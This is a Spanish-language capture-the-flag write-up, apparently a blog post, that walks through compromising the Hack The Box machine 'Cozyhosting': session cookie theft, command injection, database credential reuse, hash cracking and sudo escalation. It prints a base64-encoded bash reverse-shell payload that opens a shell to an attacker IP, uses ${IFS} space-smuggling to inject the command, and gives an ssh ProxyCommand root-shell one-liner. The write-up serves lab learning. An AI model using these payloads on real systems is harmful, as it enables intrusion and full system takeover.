---
layout: single
title: Cozyhosting - Machines - Hack The Box
excerpt: "cozyhosting es una máquina de nivel facil, con sistema operativo Linux que tiene una vulnerabilidad en una aplicación web que lleva a la toma total del control del sistema."
date: 2023-12-22
classes: wide
header:
  teaser: /assets/images/htb-machines-cozyhosting/cozyhosting1.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - machines
 
tags:  
  - BurpSuite
  - Password Cracking
  - Steal Web Session Cookie
  - cozyhosting
  - Hashcat
  - gtfobins
    
---

![](/assets/images/htb-machines-cozyhosting/cozyhosting1.png)

cozyhosting es una máquina de nivel facil, con sistema operativo Linux que tiene una vulnerabilidad en una aplicación web que lleva a la toma total del control del sistema.

## 1. Enumeración 

Realizamos un escaneo de puertos con Nmap y evidenciamos dos puertos abiertos.

•	SSH (22)

•	HTTP (80)

![](/assets/images/htb-machines-cozyhosting/cozyhosting2.png)

Al ingresar al servicio por el puerto 80, nos redirige al dominio “cozyhosting.htb”.

![](/assets/images/htb-machines-cozyhosting/cozyhosting3.png)

Vamos a agregar este dominio a nuestro archivo "etc/hosts".

![](/assets/images/htb-machines-cozyhosting/cozyhosting4.png)

Ahora navegamos al dominio y empezamos la revisión del sitio.

![](/assets/images/htb-machines-cozyhosting/cozyhosting5.png)

## 2.	Acceso Inicial

Realizamos la búsqueda de directorio con la herrmaineta “dirsearh” y encontramos el siguiente directorio.

•	/actuator/sessions.

![](/assets/images/htb-machines-cozyhosting/cozyhosting6.png)

Al ingresar al directorio, observamos que contiene los JESSIONID de los usuarios autenticados.

![](/assets/images/htb-machines-cozyhosting/cozyhosting7.png)

Procedemos a utilizar la Cookie de sesión para intentar autenticarnos en el sitio.

![](/assets/images/htb-machines-cozyhosting/cozyhosting8.png)

Luego de iniciar sesión, observamos que existe una funcionalidad que permite una conexión SSH. Procedemos a ingresar la IP de nuestro equipo y un usuario cualquiera. 

![](/assets/images/htb-machines-cozyhosting/cozyhosting9.png)

Luego interceptamos la petición con BurpSuite.

![](/assets/images/htb-machines-cozyhosting/cozyhosting10.png)

Creamos un reverse Shell y lo codificamos en base64.

![](/assets/images/htb-machines-cozyhosting/cozyhosting11.png)

Ahora vamos a necesitar convertir la carga útil en un formato sin espacios, es decir reemplazar los espacios por ${IFS%??}. Para ello vamos a utilizar el siguiente servicio en línea.

•	https://www.urlencoder.org/es.

•	Carga útil: 	echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMjYvNzc3NyAwPiYxCg==" | base64 -d | bash.

![](/assets/images/htb-machines-cozyhosting/cozyhosting12.png)

Nos ponemos a la escucha en nuestra maquina atacante por el mismo puerto que configuramos en nuestro reverse Shell. Ahora enviamos la petición desde BurpSuite y esperamos recibir la conexión.

![](/assets/images/htb-machines-cozyhosting/cozyhosting13.png)

Observamos un archivo con extensión “.jar”.

![](/assets/images/htb-machines-cozyhosting/cozyhosting14.png)

Vamos a descargarlo e intentar leer el contenido. Iniciamos un servidor web en el equipo víctima.

![](/assets/images/htb-machines-cozyhosting/cozyhosting15.png)

Ahora descargamos el contenido del archivo.

![](/assets/images/htb-machines-cozyhosting/cozyhosting16.png)

Para poder leer el contenido del archivo, vamos a necesitar instalar en nuestra maquina atacante “JD-GUI” desde la siguiente página.

•	https://java-decompiler.github.io.

Luego de la instalacion, procedemos a leer el archivo descargado. Identificamos credenciales para la base de datos PostgresSQL.

![](/assets/images/htb-machines-cozyhosting/cozyhosting17.png)

Iniciamos sesión en el equipo víctima con estas credenciales, listamos el contenido de la tabla users y encontramos dos hashes.

![](/assets/images/htb-machines-cozyhosting/cozyhosting18.png)

Guardamos esos hash en un archivo.

![](/assets/images/htb-machines-cozyhosting/cozyhosting19.png)

Ahora con la herramienta Hashcat vamos a intentar crackear el hash de admin.

![](/assets/images/htb-machines-cozyhosting/cozyhosting20.png)

Pudimos obtener la contraseña.

![](/assets/images/htb-machines-cozyhosting/cozyhosting21.png)

Ahora listamos los usuarios de la maquina y observamos el usuario “Josh”. Vamos a utilizar la contraseña junto con el usuario Josh para intentar cambiar de sesión.

Ahora que estamos en la sesión del usuario Josh, vamos a obtener nuestra primera flag.

![](/assets/images/htb-machines-cozyhosting/cozyhosting22.png)

Nos vamos a conectar por ssh con las mismas credenciales solo para tener mejor control del equipo y una Shell más interactiva.

![](/assets/images/htb-machines-cozyhosting/cozyhosting23.png)


## 3. Escalada de privilegios

Identificamos que comando puede ejecutar el usuario actual con permisos de root.

Existe una carga útil en GTFOBINS que permite generar un shell interactivo a través de la opción ProxyCommand.

•	https://gtfobins.github.io/gtfobins/ssh/#sudo

•	Carga útil: ssh -o ProxyCommand=';sh 0<&2 1>&2' x

Ahora solo nos queda obtener nuestra segunda flag.

![](/assets/images/htb-machines-cozyhosting/cozyhosting24.png)
